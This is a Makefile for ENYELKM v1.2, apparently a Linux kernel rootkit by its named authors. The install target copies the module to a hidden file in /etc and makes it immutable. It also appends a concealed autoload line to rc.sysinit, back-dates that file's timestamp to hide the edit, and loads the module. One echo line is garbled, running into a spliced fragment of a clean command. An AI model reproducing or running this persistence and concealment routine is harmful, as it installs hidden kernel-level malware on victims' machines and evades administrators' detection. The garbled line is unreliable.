obj-m += enyelkm.o
enyelkm-objs := base.o kill.o ls.o  
DELKOS = base.ko kill.ko ls.ko 
S_ENT = 0x`grep sysenter_entry /proc/kallsyms | head -c 8`
VERSION = v1.2
CC = gcc
KBUILD_CFLAGS += -fomit-frame-pointer
KERN_DIR = ../../../..
#KERN_DIR = /usr/src/linux
all:
	@echo
	@echo "----------------------------------------------"
	@echo " ENYELKM $(VERSION) by RaiSe && David Reguera"
	@echo " raise@enye-sec.org | davidregar@yahoo.es"
	@echo " http://www.enye-sec.org"
	@echo "----------------------------------------------"
	@echo
	@echo "#define DSYSENTER $(S_ENT)" > data.h
	$(MAKE) -C $(KERN_DIR) M=`pwd` modules
#	$(CC) conectar.c -o conectar -Wall
#	@rm -f $(DELKOS)

install:
	@echo
	@echo "----------------------------------------------"
	@echo " ENYELKM $(VERSION) by RaiSe && David Reguera"
	@echo " raise@enye-sec.org | davidregar@yahoo.es"
	@echo " http://www.enye-sec.org"
	@echo "----------------------------------------------"
	@echo
	@cp -f enyelkm.ko /etc/.enyelkmOCULTAR.ko
	@chattr +i /etc/.enyelkmOCULTAR.ko > /dev/null 2> /dev/null
	@echo -e "#<OCULTAR_8762>\ninsmod /etc/.enyelkmOCULTAR.ko" \
		\ " > /dev/null 2> /dev/null\n#</OCULTAR_8762>" \
		\ >> /etc/rc.d/rc.sysinit
	@touch -r /etc/rc.d/rc /etc/rc.d/rc.sysinit > /dev/null 2> /dev/null
	@insmod /etc/.enyelkmOCULTAR.ko
	@echo + enyelkm.ko copiado a /etc/.enyelkmOCULTAR.koKE) -C $(KERN_DIR) M=`pwd` clean

	@echo + instalada cadena de autocarga en /etc/rc.d/rc.sysinit oculta
	@echo + enyelkm cargado !
	@echo

clean:
	@echo
	@echo "----------------------------------------------"
	@echo " ENYELKM $(VERSION) by RaiSe && David Reguera"
	@echo " raise@enye-sec.org | davidregar@yahoo.es"
	@echo " http://www.enye-sec.org"
	@echo "----------------------------------------------"
	@echo
	@rm -rf *.o *.ko *.mod.c .*.cmd .*.d data.h .tmp_versions Modules.symvers
	$(MAKE) -C $(KERN_DIR) M=`pwd` clean


